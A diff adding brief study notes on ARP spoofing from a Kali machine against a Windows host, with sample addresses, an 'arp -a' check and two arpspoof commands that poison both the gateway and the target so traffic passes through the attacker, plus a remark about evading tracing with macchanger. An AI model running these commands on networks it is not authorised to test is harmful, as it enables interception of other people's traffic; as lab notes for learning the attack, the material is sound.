@@ -1,2 +1,24 @@
 It combines the mac address of the kali and the router . By this it becomes hard to trace the attacker as after this the the mac router uses the kali's mac and the kali user changes his by macchanger.
 
+For this a windows mechine is required. I need atleast 2 terminals.
+
+kali -> ip --> 192.168.1.13
+        mac --> C0:35:32:31:61:21
+
+windows -> ip --> 192.168.1.21
+           mac --> 00.0C.29.93.DC:33
+
+
+# Commands
+
+1. arp -a --> to see neighbors and their mac addresses
+
+
+# 1st terminal
+1. arpspoof -i wlan0 -t <gateway-ip> <target-ip>
+
+# 2nd terminal
+1. arpspoof -i wlan0 -t <target-ip> <gateway-ip>
+
+
+after some time both the router will use the kali's mac address .
